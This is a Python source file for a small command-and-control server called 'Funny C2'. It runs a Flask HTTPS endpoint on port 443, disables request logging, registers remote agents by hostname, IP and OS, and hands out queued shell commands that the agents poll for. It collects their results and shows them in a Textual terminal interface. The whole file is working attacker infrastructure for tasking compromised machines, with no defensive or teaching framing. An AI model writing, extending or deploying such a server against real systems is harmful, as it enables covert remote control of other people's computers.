from dataclasses import dataclass
from datetime import datetime
from flask import Flask, request
from textual import on
from textual.app import App, ComposeResult
from textual.widgets import Label, Input, DataTable, Log
from textual.validation import Function
from threading import Thread
import logging


@dataclass
class Agent:
    """Simple dataclass for Agent. 
    Has some commands for ease of use"""
    hostname: str
    ip: str
    os: str
    command: str
    results: list[str]
    time_since: datetime

    def __init__(self, hn, ip, os):
        self.hostname = hn
        self.ip = ip
        self.os = os
        self.command = ""
        self.results = []
        self.time_since = datetime.now()

    def row(self):
        return [self.ip, self.hostname, self.os, self.command, self.time_since.strftime('%d-%m-%Y %H:%M:%S')]
    
    def update_time(self):
        self.time_since = datetime.now()

class Interface(App):
    """This is the UI for the program"""
    def compose(self) -> ComposeResult:
        yield Label("Funny C2")
        yield DataTable()
        yield Input(
            placeholder="x.x.x.x (command)",
            validators= [
                Function(validate_ip, "IP not in list of registered agents.")
            ]
        )
        yield Log()

    @on(Input.Submitted)
    def on_input_submitted(self, event: Input.Submitted):
        """Handle submission of command to agent."""
        if event.value == "" :
            return
        strs = event.value.split()
        ip, *command = strs
        if command:
            queue_command(ip, ' '.join(command))
        event.input.clear()

    def on_mount(self):
        """Generates the DataTable with any existing agents."""
        table = self.query_one(DataTable)
        table.add_columns(('IP', 'ip'), ('Hostname', 'hostname'), ('OS', 'os'), ('Queued', 'queued'), ('Last Contact', 'last_contact'))
        for agent in agents.values():
            self.register_new(agent, table)

    def register_new(self, agent, table = None):
        """Adds a new agent to the DataTable."""
        if table is None:
            table = self.query_one(DataTable)
        row = agent.row()
        table.add_row(*row, key=agent.ip)

    def update_queued(self, ip, command):
        """Update the queued command visually."""
        table = self.query_one(DataTable)
        table.update_cell(ip, 'queued', command)

    def update_last_contact(self, ip):
        """Update the last time contact has been reached by agent recently."""
        table = self.query_one(DataTable)
        table.update_cell(ip, 'last_contact', agents[ip].time_since.strftime('%d-%m-%Y %H:%M:%S'))

    def log_result(self, text):
        """Print to log. Awful."""
        logger = self.query_one(Log)
        logger.write(text)


def validate_ip(str):
    """Validation for TUI input. Checks if ip address is in current agent list."""
    if str == "": 
        return True
    return str.split()[0] in agents.keys()

def queue_command(ip, command):
    """Queue a new command."""
    interface.log_result(f'Command queued on {ip}: "{command}"\n')
    try:
        agents[ip].command = command
        interface.update_queued(ip, command)
    except KeyError:
        ...

agents: dict[Agent] = {}

app = Flask(__name__)

interface = Interface()

@app.route("/")
def root():
    return "Hello", 200

@app.route("/register")
def register():
    """Register new agent."""
    data = request.json
    hn = data["name"]
    ip = data["ip"]
    os = data["os"]
    agents[ip] = Agent(hn, ip, os)
    interface.log_result(f"Agent Registered: ({ip})\n")
    interface.register_new(agents[ip])
    
    return "Done", 201

@app.route("/api/<ip>")
def poll_task(ip):
    """Return queued command if exists."""
    try:
        agent = agents[ip]
        agent.update_time()
        interface.update_last_contact(ip)
        return agent.command, 200
    except KeyError:
        return "bad", 500

@app.route("/api/<ip>/res")
def task_result(ip):
    """Grab result and update class, log result and update interface."""
    try:
        text = request.get_data(as_text=True)
        interface.log_result(f"{ip}:\t" + text)
        agent = agents[ip]
        agent.results.append(text)
        agent.command = ""
        agent.update_time()
        interface.update_last_contact(ip)
        interface.update_queued(ip, "")
        return "GOOD", 200
    except KeyError:
        return "bad", 500


if __name__ == "__main__":
    app.logger.disabled = True
    logging.getLogger('werkzeug').disabled = True
    flask = Thread(
        target=app.run, 
        kwargs={
            "host": "0.0.0.0", 
            "port": 443, 
            "ssl_context": ('cert.pem', 'privkey.pem')
            }, 
        daemon=True)
    flask.start()
    interface.run()
    exit()